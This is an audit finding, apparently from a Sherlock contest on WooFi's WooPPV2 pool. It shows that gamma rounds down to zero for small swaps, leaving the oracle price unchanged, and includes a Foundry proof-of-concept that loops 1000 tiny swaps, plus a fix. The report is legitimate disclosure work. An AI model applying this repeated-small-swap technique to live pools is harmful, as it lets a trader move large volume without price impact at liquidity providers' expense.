Icy Denim Cougar

medium

# Swaps can happen without changing the price for the next trade due to gamma = 0

## Summary
When a swap happens in WoofiPool the price is updated accordingly respect to such value "gamma". However, there are some cases where the swap results to a "gamma" value of "0" which will not change the new price for the next trade. 
## Vulnerability Detail
This is how the quote token received and new price is calculated when given amount of base tokens are sold to the pool:
```solidity
function _calcQuoteAmountSellBase(
        address baseToken,
        uint256 baseAmount,
        IWooracleV2.State memory state
    ) private view returns (uint256 quoteAmount, uint256 newPrice) {
        require(state.woFeasible, "WooPPV2: !ORACLE_FEASIBLE");

        DecimalInfo memory decs = decimalInfo(baseToken);

        // gamma = k * price * base_amount; and decimal 18
        uint256 gamma;
        {
            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;
            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, "WooPPV2: !maxNotionalValue");

            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;
            require(gamma <= tokenInfos[baseToken].maxGamma, "WooPPV2: !gamma");

            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)
            quoteAmount =
                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *
                    (uint256(1e18) - gamma - state.spread)) /
                1e18 /
                decs.baseDec;
        }

        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)
        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;
    }
```

Now, let's assume:
DAI is quoteToken, 18 decimals
tokenX is baseToken which has a price of 0.01 DAI, 18 decimals 
coefficient = 0.000000001 * 1e18
spread = 0.001 * 1e18
baseAmount (amount of tokenX are sold) = 1e10;

first calculate the `gamma`:
(baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;
= 1e10 * 0.01 * 1e8 * 0.000000001 * 1e18 / 1e8 / 1e18
= 0 due to round down

let's calculate the `quoteAmount` will be received:
quoteAmount =
                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *
                    (uint256(1e18) - gamma - state.spread)) /
                1e18 /
                decs.baseDec;
(1e10 * 0.01 * 1e8 * 1e18 / 1e8) * (1e18 - 0 - 0.01 * 1e18) / 1e18 / 1e18
= 99900000 which is not "0". 

let's calculate the new price:
newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;
= (1e18 - 0) * 0.01 * 1e8 / 1e18 = 0.01 * 1e8
**which is the same price, no price changes!** 

That would also means if the "gamma" is "0", then this is the best possible swap outcome. If a user does this in a for loop multiple times in a cheap network, user can trade significant amount of tokens without changing the price. 

**Coded PoC (values are the same as in the above textual scenario):**
```solidity
function test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {
        // USDC --> DAI address, mind the naming..
        uint usdcAmount = 1_000_000 * 1e18;
        uint wooAmount = 100_000 * 1e18;
        uint wethAmount = 1_000 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, wooAmount);
        deal(WETH, ADMIN, wethAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();

        uint wooAmountForTapir = 1e10 * 1000;
        vm.startPrank(TAPIR);
        deal(WOO, TAPIR, wooAmountForTapir);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();

        // WHERE THE MAGIC HAPPENS
        (uint128 price, ) = oracle.woPrice(WOO);
        console.log("price", price);
        
        uint cumulative;
        for (uint i = 0; i < 1000; ++i) {
            vm.prank(TAPIR);
            cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);
        }

        (uint128 newPrice, ) = oracle.woPrice(WOO);
        console.log("price", price);

        // price hasnt changed although there are significant amount of tokens are being traded by TAPIR
        assertEq(newPrice, price);
    }
```
## Impact
As by design, the price should change after every trade irrelevant of the amount that is being traded. Also, in a cheap network the attack can be quite realistic. Hence, I'll label this as medium. 
## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465

https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L591-L619
## Tool used

Manual Review

## Recommendation
if the "gamma" is "0", then revert. 